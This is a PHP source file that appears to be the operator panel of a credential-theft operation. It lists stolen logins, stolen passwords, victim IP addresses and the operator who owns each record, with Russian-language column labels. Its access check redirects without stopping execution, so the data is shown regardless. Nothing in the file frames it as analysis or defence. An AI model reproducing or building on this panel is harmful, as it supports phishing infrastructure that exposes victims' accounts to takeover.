<?php

use \core\{Controller, Model, FactoryAccess};

if(!isset($_SESSION['access'])){
    $_SESSION['access'] = 'User';
}



$params = FactoryAccess::getParams($_SESSION['access']);

if(!$params['all']){
    $path = Controller::url('profile');
    header("Location: $path");
}

$stmt = Model::prepare("SELECT * FROM accounts INNER JOIN users ON users.id = accounts.user_id WHERE users.access = 'User' OR users.access = 'VIP'");
$stmt->execute([]);
$data = $stmt->fetchall(\PDO::FETCH_ASSOC);

?>
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title></title>
</head>
<body>
<a href="<?= Controller::url('profile') ?>">Вернуться в профиль</a>
    <table>
        <tr>
            <td>Логин</td>
            <td>Пароль</td>
            <td>IP</td>
            <td>Владелец</td>
        </tr>
        <?php foreach($data as $d): ?>
            <tr>
                <td><?= $d['stealed_login'] ?></td>
                <td><?= $d['stealed_pass'] ?></td>
                <td><?= $d['ip'] ?></td>
                <td><?= $d['nic'] ?></td>
            </tr>
        <?php endforeach; ?>
    </table>

    </body>
</html>
